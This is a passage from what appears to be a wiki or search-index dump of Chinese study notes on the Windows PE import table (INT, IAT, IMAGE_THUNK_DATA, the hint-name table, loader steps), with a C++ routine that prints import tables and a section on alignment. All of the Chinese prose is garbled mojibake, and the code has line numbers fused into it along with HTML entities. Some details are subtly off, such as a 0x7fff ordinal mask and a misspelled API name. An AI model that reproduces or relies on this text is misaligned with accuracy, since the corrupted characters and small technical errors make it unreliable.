TimeDateStampï¼šæ—¶é—´æˆ³ï¼Œå¯ä»¥å¿½ç•¥ã€‚ ForwarderChainï¼šæ²¡å•¥ç”¨ è¿™æ˜¯ç¬¬1ä¸ªè¢«è½¬å‘çš„APIçš„ç´¢å¼•ï¼Œä¸€èˆ¬ä¸º0ï¼Œåœ¨ç¨‹åºå¼•ç”¨ä¸€ä¸ªDLLä¸­çš„API, è€Œè¿™ä¸ªAPIåˆåœ¨å¼•ç”¨å…¶ä»–DLLçš„APIæ—¶ä½¿ç”¨(ä½†è¿™æ ·çš„æƒ…å†µå¾ˆå°‘å‡ºç°)ã€‚ã€ŠåŠ å¯†ä¸è§£å¯†4thã€‹P423 Nameï¼šæŒ‡å‘ä¸€ä¸ªä»¥â€™\\0â€™ç»“å°¾çš„ASCIIå­—ç¬¦ä¸²ï¼Œè¿™ä¸ªå€¼æ˜¯RVAã€‚æŒ‡å‘çš„å­—ç¬¦ä¸²æ˜¯å¯¼å…¥çš„DLLåå­—ï¼Œä¾‹å¦‚Kernel32.dllï¼ŒUser32.dllã€‚ FirstThunkï¼šä¸€ä¸ªæŒ‡å‘å¯¼å…¥åœ°å€è¡¨ï¼ˆIATï¼ŒImport Address Tableï¼‰çš„RVAåœ°å€ã€‚ æ•°æ®ç›®å½•è¡¨çš„ç¬¬13é¡¹ç›´æ¥æŒ‡å‘äº†IATè¡¨çš„RVAåœ°å€ï¼Œé€šè¿‡è¿™ä¸ªä¹Ÿèƒ½ç›´æ¥æ‰¾åˆ°IATè¡¨ã€‚ INTè¡¨æ˜¯ä¸€ä¸ªIMAGE_THUNK_DATAç»“æ„çš„æ•°ç»„ï¼ŒIATè¡¨ä¹Ÿæ˜¯ä¸€ä¸ªIMAGE_THUNK_DATAç»“æ„çš„æ•°ç»„ã€‚å®ƒä»¬éƒ½æ˜¯ä»¥å…¨0çš„IMAGE_THUNK_DATAç»“æ„ä½“ä½œä¸ºç»“æŸæ ‡å¿—ã€‚ åœ¨PEæ–‡ä»¶è¿è¡Œå‰INTè¡¨å’ŒIATè¡¨çš„å†…å®¹å®Œå…¨ä¸€æ ·ã€‚å‡è®¾OriginalFirstThunkæŒ‡å‘çš„INTè¡¨åœ¨æ–‡ä»¶çš„ä½ç½®Aï¼ŒFirstThunkæŒ‡å‘çš„IATè¡¨åœ¨æ–‡ä»¶çš„ä½ç½®Bï¼Œå®ƒä»¬ä½ç½®ä¸åŒï¼Œä½†æ˜¯INTè¡¨å’ŒIATè¡¨çš„å†…å®¹å®Œå…¨ä¸€æ ·ã€‚ä¸”éƒ½æŒ‡å‘åŒä¸€ä»½æç¤ºåè¡¨ï¼ˆHint-name Tableï¼‰ã€‚ PE32PE32+123456789typedef struct _IMAGE_THUNK_DATA32 &#123; union &#123; DWORD ForwarderString; DWORD Function; DWORD Ordinal; // åºå· DWORD AddressOfData; // æŒ‡å‘PIMAGE_IMPORT_BY_NAMEï¼Œæ˜¯ä¸€ä¸ªRVAåœ°å€ &#125; u1;&#125; IMAGE_THUNK_DATA32;typedef IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;123456789typedef struct _IMAGE_THUNK_DATA64 &#123; union &#123; ULONGLONG ForwarderString; // PBYTE ULONGLONG Function; // PDWORD ULONGLONG Ordinal; ULONGLONG AddressOfData; // PIMAGE_IMPORT_BY_NAME &#125; u1;&#125; IMAGE_THUNK_DATA64;typedef IMAGE_THUNK_DATA64 * PIMAGE_THUNK_DATA64; IMAGE_THUNK_DATAæ˜¯ä¸ªè”åˆç»“æ„ï¼Œè”åˆç»“æ„å çš„ç©ºé—´å–å†³äºè”åˆç»“æ„ä¸­æœ€å®½çš„é‚£ä¸ªæˆå‘˜ã€‚PE32æ˜¯DWORDå¤§å°ã€‚ å½“è¿™ä¸ªDWORDå€¼æœ€é«˜ä½ä¸º1æ—¶ï¼Œè¡¨ç¤ºå‡½æ•°ä»¥åºå·æ–¹å¼å¯¼å…¥ã€‚æ­¤æ—¶ä½31ä½æ˜¯ä¸€ä¸ªå‡½æ•°åºå·ã€‚ å½“è¿™ä¸ªDWORDå€¼æœ€é«˜ä½ä¸º0æ—¶ï¼Œè¡¨ç¤ºå‡½æ•°ä»¥å‡½æ•°åæ–¹å¼å¯¼å…¥ã€‚æ­¤æ—¶è¿™ä¸ªDWORDå€¼æ˜¯ä¸€ä¸ªæŒ‡å‘IMAGE_IMPORT_BY_NAMEç»“æ„çš„RVAåœ°å€ã€‚ æœ‰æ—¶è¢«ç§°ä¸ºæç¤ºåè¡¨ï¼ˆHint-name Tableï¼‰1234typedef struct _IMAGE_IMPORT_BY_NAME &#123; WORD Hint; CHAR Name[1];&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME; Hintï¼šè¿™ä¸ªå¯¼å…¥å‡½æ•°åœ¨å…¶æ‰€é©»ç•™DLLè¾“å‡ºè¡¨ä¸­çš„åºå·ï¼ˆè¿™ä¸ªåºå·ä¸ç­‰äºå¯¼å‡ºå‡½æ•°çš„å¯¼å‡ºåºå·ï¼Œæ˜¯å¯¼å‡ºåºå·-Baseåçš„å€¼ï¼‰ï¼Œå¯ä»¥ç›´æ¥æ‹¿è¿™ä¸ªåºå·å½“æ•°ç»„ç´¢å¼•å»å¯¼å‡ºå‡½æ•°åœ°å€è¡¨æŸ¥è¡¨ã€‚ ä¸è¿‡Hintè¿™ä¸ªå€¼å¯èƒ½ä¸å‡†ç¡®ã€‚å› ä¸ºæ˜¯è¿™æ ·çš„ï¼Œæ ¹æ®IATè¡¨æ›´æ–°çš„è¿‡ç¨‹å¯ä»¥çŸ¥é“ï¼šå…ˆæŸ¥åˆ°INTè¡¨ï¼Œ INTè¡¨é‡Œçš„å€¼å¦‚æœé«˜ä½ä¸º0ï¼Œè¡¨ç¤ºæ˜¯åå­—æ–¹å¼å¯¼å…¥ï¼Œè¿™æ—¶æ‰ä¼šç»§ç»­æ‰¾åˆ°IMAGE_IMPORT_BY_NAMEç»“æ„ã€‚é‚£é€šè¿‡åå­—å»æŸ¥å¯¼å‡ºè¡¨è·å¾—å‡½æ•°åœ°å€å‘—ï¼Œä¸ç”¨å…³å¿ƒè¿™ä¸ªåºå·äº†ã€‚ è€ŒINTè¡¨é‡Œçš„å€¼å¦‚æœé«˜ä½ä¸º1ï¼Œè¡¨ç¤ºæ˜¯åºå·å¯¼å‡ºï¼Œé‚£ç›´æ¥æ‹¿åºå·å»æŸ¥åœ°å€è¡¨äº†ï¼Œæ²¡æœ‰åç»­çš„IMAGE_IMPORT_BY_NAMEç»“æ„äº†ã€‚ hintåœ¨è‹±æ–‡ä¸­æ˜¯æç¤ºçš„æ„æ€ Nameï¼šå¯¼å…¥å‡½æ•°çš„å‡½æ•°åã€‚è¿™ä¸ªå‡½æ•°åæ˜¯ä¸€ä¸ªä»¥â€™\\0â€™ç»“å°¾çš„ASCIIå­—ç¬¦ä¸²ã€‚å› ä¸ºå‡½æ•°åé•¿åº¦ä¸å®šï¼Œè¿™é‡Œç»“æ„ä½“ä¸­ç”¨çš„CHARï¼ˆä¸€ä¸ªå­—èŠ‚ï¼‰çš„æ•°æ®ç±»å‹æ¥è¡¨ç¤ºã€‚åœ¨å®é™…ç”¨è¿™ä¸ªåå­—æ—¶è¦éå†åˆ°â€™\\0â€™ç»“å°¾ã€‚ å°ç»“ é€šè¿‡æ•°æ®ç›®å½•è¡¨ç¬¬2é¡¹çš„RVAåœ°å€ï¼Œå¯æ‰¾åˆ°ä¸€å¼ å¼ çš„å¯¼å…¥è¡¨ã€‚æ¯ä¸ªå¯¼å…¥è¡¨æè¿°ä¸€ä¸ªè¦å¯¼å…¥çš„dllæ–‡ä»¶ã€‚æ¯ä¸ªIIDç»“æ„ä¸­åˆ†åˆ«æœ‰OriginalFirstThunkæŒ‡å‘INTè¡¨ï¼Œæœ‰FirstThunkæŒ‡å‘IATè¡¨ã€‚åœ¨INTè¡¨å’ŒIATè¡¨ä¸­ï¼Œæè¿°äº†è¦å¯¼å…¥è¿™ä¸ªdllä¸­çš„å“ªäº›å‡½æ•°ï¼ˆåŒ…æ‹¬å‡½æ•°åæè¿°å’Œåºå·æè¿°ï¼‰ã€‚ åœ¨PEæ–‡ä»¶è¿è¡Œå‰ï¼ŒINTè¡¨å’ŒIATè¡¨å­˜åœ¨æ–‡ä»¶ä¸­çš„ä¸åŒä½ç½®ï¼Œä½†INTè¡¨å’ŒIATè¡¨çš„å†…å®¹ä¸€æ ·ã€‚å½“PEæ–‡ä»¶è¿è¡Œåï¼ŒIATè¡¨çš„å†…å®¹ä¼šè¢«ç”±ç³»ç»ŸåŠ è½½å™¨æ›¿æ¢ä¸ºå®é™…çš„å‡½æ•°åœ°å€ï¼Œæ›¿æ¢çš„æ­¥éª¤å¦‚ä¸‹ï¼š è¯»å–IIDçš„Nameæˆå‘˜ï¼Œè·å–åº“åç§°å­—ç¬¦ä¸²(â€œkernel32.dllâ€)ã€‚ è£…è½½ç›¸åº”åº“ â†’LoadLibrary(â€œkernel32.dllâ€) è¯»å–IIDçš„OriginalFirstThunkæˆå‘˜ï¼Œè·å–INTåœ°å€ã€‚ é€ä¸€è¯»å–INTä¸­æ•°ç»„çš„å€¼ï¼Œè·å–ç›¸åº”IMAGE_IMPORT_BY_NAMEåœ°å€(RVA) ã€‚ ä½¿ç”¨IMAGE_IMPORT_BY_NAMEçš„Hint(ordinal)æˆ–Nameé¡¹ï¼Œè·å–ç›¸åº”å‡½æ•°çš„èµ·å§‹åœ°å€ã€‚ â†’GetProcAddress(â€œGetCurrentThreadldâ€) æ ¹æ®IIDçš„FirstThunk (IAT)æˆå‘˜ï¼Œè·å¾—IATåœ°å€ ç”¨ä¸Šé¢è·å¾—çš„å‡½æ•°åœ°å€æ›¿æ¢ç›¸åº”IATæ•°ç»„ä¸­çš„å€¼ é‡å¤ä»¥ä¸Šæ­¥éª¤4~7ï¼Œç›´è‡³éå†æ‰€æœ‰INTç»“æŸï¼ˆé‡åˆ°NULLæ—¶ï¼‰ ã€Šé€†å‘æ ¸å¿ƒå·¥ç¨‹åŸç†ã€‹P108 ä»ä¸€ä¸ªPEæ–‡ä»¶è£…è½½è¿‡ç¨‹è¯´èµ·çš„è¯ä¾¿æ˜¯ï¼š åŒå‡»ä¸€ä¸ªexe ç³»ç»ŸåŠ è½½å™¨å°†exeä»¥æ‹‰ä¼¸æ€è´´åˆ°è¿›ç¨‹ç©ºé—´çš„ImageBaseå¤„ éå†exeçš„å¯¼å…¥è¡¨é€ä¸€å°†dllä»¥æ‹‰ä¼¸æ€è´´åˆ°è¿›ç¨‹ç©ºé—´çš„ImageBaseå¤„ æŸäº›dllé¢„è®¾çš„ImageBaseå¯èƒ½è¢«å…¶ä»–dllå äº†ï¼Œé‚£ä¹ˆè¿™ä¸ªdllä¼šåŠ è½½åˆ°å…¶ä»–åŸºå€ï¼Œå¹¶æŒ‰é‡å®šä½è¡¨ä¿®å¤é‡å®šä½æ•°æ® æ›¿æ¢IATè¡¨å†…å®¹ï¼šé€šè¿‡éå†å¯¼å…¥è¡¨-INTè¡¨å»dllè·å–å¯¼å‡ºå‡½æ•°åœ°å€ï¼Œæ›¿æ¢IATè¡¨å†…å®¹ PEæ–‡ä»¶åŠ è½½å‰PEæ–‡ä»¶åŠ è½½å ä¸‹é¢ç¤ºæ„å›¾ä¸­åç§°æç¤ºè¡¨Hint-name Tableçœ‹èµ·æ¥å¥½åƒæ˜¯è¦è¿ç»­çš„ã€‚å®é™…ä¸Šå®ƒä»¬ä¹‹é—´å¯ä»¥æœ‰ç¼éš™æ”¾äº›å…¶ä»–å†…å®¹ï¼Œä½†ä¸€èˆ¬æƒ…å†µä¸‹å®ƒä»¬ä¸­é—´æ²¡ç¼éš™ã€‚ç¼–ç¨‹æ—¶åç§°æç¤ºè¡¨çš„æ¯ä¸€é¡¹éƒ½æ˜¯ç”±INTè¡¨æˆ–IATè¡¨è¡¨é¡¹æ‰¾è¿‡å»çš„ã€‚ ç¨‹åºä¸­è°ƒç”¨å¯¼å…¥å‡½æ•°éƒ½æ˜¯é—´æ¥è°ƒç”¨ï¼ŒæŒ‡å‘IATè¡¨ã€‚å½“ç³»ç»ŸåŠ è½½å™¨å®ŒæˆIATè¡¨è¡¨é¡¹å‡½æ•°åœ°å€çš„æ›´æ–°åï¼Œè¿™äº›é—´æ¥è°ƒç”¨å°±èƒ½æ­£ç¡®è°ƒç”¨åˆ°å¯¼å…¥å‡½æ•°äº†ã€‚ ç¨‹åºä¸­è°ƒç”¨å¯¼å…¥å‡½æ•°çš„æ±‡ç¼–æŒ‡ä»¤å¯èƒ½æ˜¯ 1234\tcall 00401164\tâ€¦â€¦:00401164\tjmp dword ptr [00402010]\t;æŒ‡å‘User32.LoadIconAå‡½æ•° æˆ– 1call dword ptr [00402010]\t;æŒ‡å‘User32.LoadIconAå‡½æ•° ï¼ˆä¸Šé¢ç”»å›¾åªç”»äº†å…¶ä¸­ä¸€ç§æƒ…å†µï¼‰ Q&amp;A å¯¼å…¥å‡½æ•°çš„åœ°å€ä¸ºä»€ä¹ˆè¦ç”¨é—´æ¥è°ƒç”¨çš„æ–¹å¼ï¼Œè€Œä¸æ˜¯åƒæ™®é€šå‡½æ•°é‚£æ ·ç›´æ¥å°†åœ°å€å†™æ­»ï¼Ÿç›´æ¥å†™æ­»æ•ˆç‡ä¸æ˜¯æ›´é«˜å—ï¼ˆé—´æ¥è°ƒç”¨è¦å…ˆå»å–ç›®æ ‡å†…å­˜é‡Œçš„å€¼ï¼Œç„¶åæ‰è°ƒç”¨ï¼Œå…ˆæ¯”äºç›´æ¥è°ƒç”¨ä¼šèŠ±è´¹æ›´å¤šçš„æ‰§è¡Œæ—¶é—´ï¼‰ï¼Ÿ ç­”ï¼šç”¨é—´æ¥è°ƒç”¨çš„æ–¹å¼æ˜¯å› ä¸ºå¯¼å…¥å‡½æ•°çš„å‡½æ•°åœ°å€åœ¨PEæ–‡ä»¶åŠ è½½åæ‰èƒ½ç¡®å®šï¼Œè¿™æœ‰ä¸¤æ–¹é¢çš„å› ç´ ï¼š Windowså¼•å…¥äº†DLLæ˜¯ä¸ºäº†æ¨¡å—åŒ–ã€‚ä¸€ä¸ªexe+å¤šä¸ªdllï¼Œå“ªä¸ªæ¨¡å—æœ‰é—®é¢˜æ”¹é‚£ä¸ªæ¨¡å—çš„dllå³å¯ã€‚å½“notepad.exeåœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿä¸‹è¿è¡Œï¼Œä¸åŒæ“ä½œç³»ç»Ÿç‰ˆæœ¬çš„kernel32.dllç‰ˆæœ¬å„ä¸ç›¸åŒï¼ŒCreateFileWå‡½æ•°çš„ä½ç½®ï¼ˆåœ°å€ï¼‰ä¹Ÿä¸ç›¸åŒã€‚ç›®æ ‡å¯¼å…¥å‡½æ•°åœ°å€åªèƒ½åœ¨æ‰§è¡Œæ–‡ä»¶æ—¶ç”±PEåŠ è½½å™¨å¡«å……åæ‰çŸ¥é“ã€‚ DLLé‡å®šä½ï¼šDLLæ–‡ä»¶åŠ è½½è¿›è¿›ç¨‹ç©ºé—´æ—¶å¯èƒ½å‘ç”Ÿé‡å®šä½ï¼Œåªæœ‰å½“ç›®æ ‡DLLåŠ è½½å®Œäº†+ä¿®å¤å®Œé‡å®šä½æ•°æ®åæ‰èƒ½ç¡®å®šå‡½æ•°åœ°å€ã€‚ åªæœ‰IATè¡¨ä¸å°±å¥½äº†ï¼Œæ ¹æ®IATè¡¨æŒ‡å‘åç§°æç¤ºè¡¨ï¼Œç„¶åæ›´æ–°IATè¡¨ä¸ºå¯¼å…¥å‡½æ•°çš„å‡½æ•°åœ°å€ï¼Œéšåå°±èƒ½æ­£å¸¸ä½¿ç”¨äº†ã€‚ä¸ºä»€ä¹ˆè¿˜è¦é¢å¤–çš„INTè¡¨ï¼Ÿ ç­”ï¼š ç•™ä¸€ä»½ä½œä¸ºå¤‡ä»½ã€‚å½“IATè¡¨éƒ½æ›´æ–°ä¸ºå¯¼å…¥å‡½æ•°çš„å®é™…åœ°å€åï¼Œä¸‡ä¸€ä»€ä¹ˆæ—¶å€™å‡ºé”™äº†ï¼Œè¿˜å¯ä»¥æ ¹æ®INTè¡¨ä¿®å¤IATè¡¨é‡Œçš„å†…å®¹ã€‚ IATè¡¨æ›´æ–°ä¸ºå¯¼å…¥å‡½æ•°çš„å®é™…åœ°å€åã€‚æ­¤æ—¶è¿˜æœ‰ä¸€ä»½INTè¡¨ï¼Œå°±èƒ½çŸ¥é“IATè¡¨é‡Œçš„å‡½æ•°åœ°å€å¯¹åº”çš„å‡½æ•°åæ˜¯ä»€ä¹ˆã€‚ æ‰“å°å¯¼å…¥è¡¨ åˆ†åˆ«æ‰“å°å¯¼å…¥è¡¨å„ä¸ªå­—æ®µã€INTè¡¨ã€IATè¡¨ è¿™é‡Œæ³¨æ„ä¸‹æ‰“å°IATè¡¨æ—¶è¦åˆ†æƒ…å†µï¼š å¯¼å…¥è¡¨.TimeDateStampæ—¶é—´æˆ³ = 0xFFFFFFFFï¼Œè¡¨ç¤ºIATè¡¨å·²ç»‘å®šåœ°å€ã€‚ç»‘å®šæ—¶é—´ä¸ºç»‘å®šå¯¼å…¥è¡¨IMAGE_BOUND_IMPORT_DESCRIPTORçš„TimeDateStampå­—æ®µï¼ˆè¿™æ˜¯ç»‘å®šå¯¼å…¥è¡¨çš„çŸ¥è¯†ï¼‰ å¯¼å…¥è¡¨.TimeDateStampæ—¶é—´æˆ³ = 0ï¼Œè¡¨ç¤ºIATè¡¨æœªç»‘å®šåœ°å€ï¼Œæ­¤æ—¶IATè¡¨å’ŒINTè¡¨å†…å®¹ä¸€æ · 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113VOID PEManipulator::PrintImpotrTable()&#123; auto pImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)GetDataDirectoryPointer(IMAGE_DIRECTORY_ENTRY_IMPORT); if (!pImportDirectory) &#123; return; &#125; int Index = 0; // ç¬¬å‡ ä¸ªå¯¼å…¥è¡¨ while (pImportDirectory-&gt;OriginalFirstThunk &amp;&amp; pImportDirectory-&gt;FirstThunk) //é‡è¦æˆå‘˜ä¸º0æ—¶ç»“æŸå¾ªç¯ &#123; //æ‰“å°å¯¼å…¥è¡¨å„ä¸ªå­—æ®µ printf(&quot; %d. Image Import Descriptor: &quot;, Index++); printf(&quot; OriginalFirstThunk: 0x%08X &quot;, pImportDirectory-&gt;OriginalFirstThunk); printf(&quot; TimeDateStamp: 0x%08X &quot;, pImportDirectory-&gt;TimeDateStamp); printf(&quot; ForwarderChain: 0x%08X &quot;, pImportDirectory-&gt;ForwarderChain); DWORD dwNameFOA = 0; if (!RVAToFOA(pImportDirectory-&gt;Name, dwNameFOA)) &#123; return; &#125; auto cModuleName = (PCHAR)((DWORD)m_lpFileBuffer + dwNameFOA); printf(&quot; Name: 0x%08X (\\&quot;%s\\&quot;) &quot;, pImportDirectory-&gt;Name, cModuleName); printf(&quot; FirstThunk: 0x%08X &quot;, pImportDirectory-&gt;FirstThunk); //æ‰“å°INTè¡¨ DWORD dwOriginalFirstThunk_FOA = 0; if (!RVAToFOA(pImportDirectory-&gt;OriginalFirstThunk, dwOriginalFirstThunk_FOA)) &#123; return; &#125; auto pINTTable = (PDWORD)((DWORD)m_lpFileBuffer + dwOriginalFirstThunk_FOA); printf(&quot; INT Tableï¼š &quot;); // å¯¹é½è¡¨å¤´ printf(&quot;\\t Thunk RVA Thunk FOA Thunk Value ----------------&gt; Hint API Name &quot;); printf(&quot;\\t ----------- ----------- ------------ ---------- ------------ &quot;); while (*pINTTable) &#123; if (IMAGE_SNAP_BY_ORDINAL(*pINTTable)) //æœ€é«˜ä½ä¸º1ï¼Œåºå·æ–¹å¼è¾“å…¥ &#123; printf(&quot;\\t 0x%08X 0x%08X 0x%08X Original:0x%08X - - &quot;, pImportDirectory-&gt;OriginalFirstThunk, dwOriginalFirstThunk_FOA, *pINTTable, *pINTTable &amp; 0x7fff); &#125; else //æœ€é«˜ä½ä¸º0ï¼Œå‡½æ•°åæ–¹å¼è¾“å…¥ &#123; DWORD dwHintNameTable_FOA = 0; if (!RVAToFOA(*pINTTable, dwHintNameTable_FOA)) &#123; return; &#125; auto pHintNameTable = (PIMAGE_IMPORT_BY_NAME)((DWORD)m_lpFileBuffer + dwHintNameTable_FOA); printf(&quot;\\t 0x%08X 0x%08X 0x%08X 0x%04X %s &quot;, pImportDirectory-&gt;OriginalFirstThunk, dwOriginalFirstThunk_FOA, *pINTTable, pHintNameTable-&gt;Hint, (PCHAR)pHintNameTable-&gt;Name); &#125; ++pINTTable; &#125; //æ‰“å°IATè¡¨ DWORD dwFirstThunk_FOA = 0; if (!RVAToFOA(pImportDirectory-&gt;FirstThunk, dwFirstThunk_FOA)) &#123; return; &#125; auto pIATTable = (PDWORD)((DWORD)m_lpFileBuffer + dwFirstThunk_FOA); printf(&quot; IAT Tableï¼š &quot;); if (pImportDirectory-&gt;TimeDateStamp == 0xFFFFFFFF) //æ—¶é—´æˆ³ = 0xFFFFFFFFï¼ŒIATè¡¨å·²ç»‘å®šåœ°å€ &#123; // å¯¹é½è¡¨å¤´ printf(&quot;\\t Thunk RVA Thunk FOA Thunk Value &quot;); printf(&quot;\\t ----------- ----------- ------------ &quot;); while (*pIATTable) &#123; printf(&quot;\\t 0x%08X 0x%08X 0x%08X Func Address:0x%08X &quot;, pImportDirectory-&gt;FirstThunk, dwFirstThunk_FOA, *pIATTable, *pIATTable); ++pIATTable; &#125; &#125; else if (pImportDirectory-&gt;TimeDateStamp == 0) //æ—¶é—´æˆ³ = 0ï¼ŒIATè¡¨æœªç»‘å®šåœ°å€ï¼Œå’ŒINTè¡¨å†…å®¹ä¸€æ · &#123; // å¯¹é½è¡¨å¤´ printf(&quot;\\t Thunk RVA Thunk FOA Thunk Value ----------------&gt; Hint API Name &quot;); printf(&quot;\\t ----------- ----------- ------------ ---------- ------------ &quot;); while (*pIATTable) &#123; if (IMAGE_SNAP_BY_ORDINAL(*pIATTable)) //æœ€é«˜ä½ä¸º1ï¼Œåºå·æ–¹å¼è¾“å…¥ &#123; printf(&quot;\\t 0x%08X 0x%08X 0x%08X Original:0x%08X - - &quot;, pImportDirectory-&gt;FirstThunk, dwFirstThunk_FOA, *pIATTable, *pIATTable &amp; 0x7fff); &#125; else //æœ€é«˜ä½ä¸º0ï¼Œå‡½æ•°åæ–¹å¼è¾“å…¥ &#123; DWORD dwHintNameTable_FOA = 0; if (!RVAToFOA(*pIATTable, dwHintNameTable_FOA)) &#123; return; &#125; auto pHintNameTable = (PIMAGE_IMPORT_BY_NAME)((DWORD)m_lpFileBuffer + dwHintNameTable_FOA); printf(&quot;\\t 0x%08X 0x%08X 0x%08X 0x%04X %s &quot;, pImportDirectory-&gt;FirstThunk, dwFirstThunk_FOA, *pIATTable, pHintNameTable-&gt;Hint, (PCHAR)pHintNameTable-&gt;Name); &#125; ++pIATTable; &#125; &#125; ++pImportDirectory; //ä¸‹ä¸€ä¸ªå¯¼å…¥è¡¨ &#125;&#125;"},{"title":"ä¸€äº›æ¦‚å¿µ","path":"/wiki/PE/ä¸€äº›æ¦‚å¿µ_PE.html","content":"PEæ–‡ä»¶çš„ä¸¤ç§çŠ¶æ€ PEæ–‡ä»¶å­˜åœ¨äºä¸¤ä¸ªä¸åŒçš„çŠ¶æ€ï¼šåœ¨è¿è¡Œä¹‹å‰ï¼Œå®ƒæ˜¯å­˜å‚¨åœ¨ç£ç›˜ä¸Šçš„ä¸€ä¸ªæ–‡ä»¶ï¼›å½“è¿è¡Œæ—¶ï¼Œå®ƒè¢«åŠ è½½åˆ°å†…å­˜ä¸­ã€‚ç£ç›˜ä¸Šçš„æ–‡ä»¶å’Œå†…å­˜ä¸­çš„æ–‡ä»¶æœ‰ä¸åŒçš„å¯¹é½è¦æ±‚ã€‚æ­£æ˜¯å› ä¸ºè¿™ä¸¤ç§çŠ¶æ€ä¸‹çš„å¯¹é½å€¼å­˜åœ¨å·®å¼‚ï¼ŒPEæ–‡ä»¶åœ¨ä»ç£ç›˜åŠ è½½åˆ°å†…å­˜æ—¶éœ€è¦è¿›è¡Œè°ƒæ•´ï¼Œè¿™ä¸ªè¿‡ç¨‹é€šå¸¸è¢«ç§°ä¸ºâ€œæ‹‰ä¼¸â€ã€‚ Sectionåœ¨å†…å­˜ä¸­åˆ†é…çš„ç©ºé—´å¤§å° åœ¨Sectionä¸­ï¼š æœªåˆå§‹åŒ–çš„æ•°æ®ï¼ˆå¦‚å£°æ˜äº†ä¸€äº›å…¨å±€å˜é‡ï¼Œä½†æ²¡æœ‰èµ‹åˆå€¼ï¼‰ï¼Œåœ¨ç£ç›˜ä¸­ä¸å æœ‰ç©ºé—´ï¼Œä½†å½“è¿™ä¸ªèŠ‚è½½å…¥å†…å­˜åè¦ç»™è¿™äº›æ•°æ®åˆ†é…å†…å­˜ç©ºé—´ï¼Œéšåinitialize and useå®ƒä»¬ã€‚ å·²åˆå§‹åŒ–çš„æ•°æ®ï¼ˆå¦‚å£°æ˜äº†ä¸€äº›å…¨å±€å˜é‡ï¼Œå¹¶èµ‹äº†åˆå€¼ï¼‰ï¼Œåœ¨ç£ç›˜ä¸­ä¼šå æœ‰ç©ºé—´ã€‚ è¿™æ„å‘³ç€ä¸€ä¸ªSecionå› ä¸ºå«æœ‰æœªåˆå§‹åŒ–çš„æ•°æ®ï¼Œå¯¼è‡´ä¼šå‡ºç°Miscï¼ˆè¯¥èŠ‚å®é™…çš„å¤§å°ï¼‰&gt;SizeOfRawDataï¼ˆè¯¥åŒºå—åœ¨ç£ç›˜æ–‡ä»¶ä¸­å¯¹é½åçš„å¤§å°ï¼‰çš„æƒ…å†µå‡ºç°ï¼Œé‚£ä¹ˆå½“è¯¥èŠ‚è½½å…¥å†…å­˜åï¼Œå®é™…åˆ†é…çš„ç©ºé—´æ˜¯Miscã€‚ç›¸åï¼Œå¦‚æœä¸€ä¸ªSecionçš„Miscï¼ˆè¯¥èŠ‚å®é™…çš„å¤§å°ï¼‰&lt;SizeOfRawDataï¼ˆè¯¥åŒºå—åœ¨ç£ç›˜æ–‡ä»¶ä¸­å¯¹é½åçš„å¤§å°ï¼‰ï¼Œé‚£ä¹ˆå½“è¯¥èŠ‚è½½å…¥å†…å­˜åï¼Œå®é™…åˆ†é…çš„ç©ºé—´æ˜¯SizeOfRawDataã€‚ å°ç»“ï¼Œå†…å­˜ä¸­Sectionåˆ†é…çš„ç©ºé—´ä¸ºmax{Misc,SizeOfRawData}ï¼Œå“ªä¸ªå¤§æŒ‰å“ªä¸ªåˆ†é…ã€‚ ä½†åœ¨å®é™…æ“ä½œè¿‡ç¨‹ä¸­ï¼Œç¼–è¯‘å™¨ç¼–è¯‘æºæ–‡ä»¶æ—¶ä¼šç®—å‡ºè¿™ä¸ªèŠ‚å°†æ¥ä¼šåœ¨å†…å­˜ä¸­ç”¨å¤šå¤§çš„ç©ºé—´ï¼Œè¿™ä¼šä½“ç°åœ¨VirtualAddressè¿™ä¸ªå€¼ä¸Šã€‚æ‰€ä»¥å½“PEæ–‡ä»¶è½½å…¥å†…å­˜æ—¶çš„æ‹‰ä¼¸ï¼Œå¯¹äºèŠ‚æ•°æ®çš„å±•å¼€ï¼Œåšæ³•æ˜¯ä¾æ¬¡å¯¹æ¯ä¸ªèŠ‚è¿›è¡Œæ‹·è´ï¼šä»PointerToRawDataå¤„æ‹·è´SizeOfRawDataå¤§å°çš„æ•°æ®åˆ°VirtualAddressã€‚ å¦‚æœæŒ‰max{Misc,SizeOfRawData}æ¥æ‹·ï¼Œå¯èƒ½ä¼šå› ä¸ºå½“å‰è¿™ä¸ªèŠ‚çš„Miscå¤ªå¤§ï¼Œè€Œæ‹·åˆ°ä¸‹ä¸€ä¸ªèŠ‚çš„æ•°æ®ã€‚ ï¼ˆä¸‹é¢è¿™ä¸ªç†è®ºä¸Šæ˜¯ï¼Œä½†æˆ‘æ”¹äº†Miscåå°±è¿è¡Œä¸äº†ï¼Œæœªæ¥å†è€ƒè¯ï¼‰ å¦‚æœæˆ‘ä»¬æ‰¾ä¸€ä¸ªexeï¼Œå¯¹é‚£äº›Misc&gt;SizeOfRawDataçš„èŠ‚ï¼Œéšæ„ä¿®æ”¹Miscçš„å€¼ï¼Œè¯¥exeä¹Ÿèƒ½è¿è¡Œï¼Œè¿™å°±è¯æ˜äº†ç³»ç»ŸåŠ è½½å™¨æ‹‰ä¼¸æ—¶æ˜¯æŒ‰SizeOfRawDataæ‹·çš„ã€‚ è¿™æ ·ä¸€æ¥ï¼Œé‚£äº›æœªåˆå§‹åŒ–çš„æ•°æ®åœ¨å†…å­˜ä¸­å°±æœ‰äº†ä½ç½®ï¼Œè‡³äºç³»ç»ŸåŠ è½½å™¨åé¢åšçš„äº‹æƒ…ï¼Œæ€ä¹ˆæ‰¾åˆ°è¿™äº›æœªåˆå§‹åŒ–çš„æ•°æ®ï¼Œè¿™ä¸ªç›®å‰æˆ‘æ— æ³•å›ç­”ã€‚ å¯¹é½å€¼ PEåœ¨ç£ç›˜ä¸Šï¼Œæ¯ä¸ªSectionè¦å¯¹é½äºFileAlignmentï¼Œå³åŒºå—çš„èµ·å§‹åœ°å€æ˜¯FileAlignmentçš„æ•´æ•°å€ã€‚ PEåœ¨å†…å­˜ä¸­è¿è¡Œæ—¶ï¼Œæ¯ä¸ªSectionè¦å¯¹é½äºSectionAlignmentï¼Œå³åŒºå—çš„èµ·å§‹åœ°å€æ˜¯SectionAlignmentçš„æ•´æ•°å€ã€‚ 